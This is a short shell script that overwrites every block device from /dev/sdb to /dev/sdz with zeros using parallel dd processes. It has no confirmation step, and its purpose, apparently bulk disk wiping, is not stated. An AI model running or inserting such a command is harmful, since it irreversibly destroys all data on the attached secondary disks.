#!/bin/sh

devs=`ls /dev/sd[b-z]`

for dev in $devs
do
    dd if=/dev/zero of=$dev &
done
wait
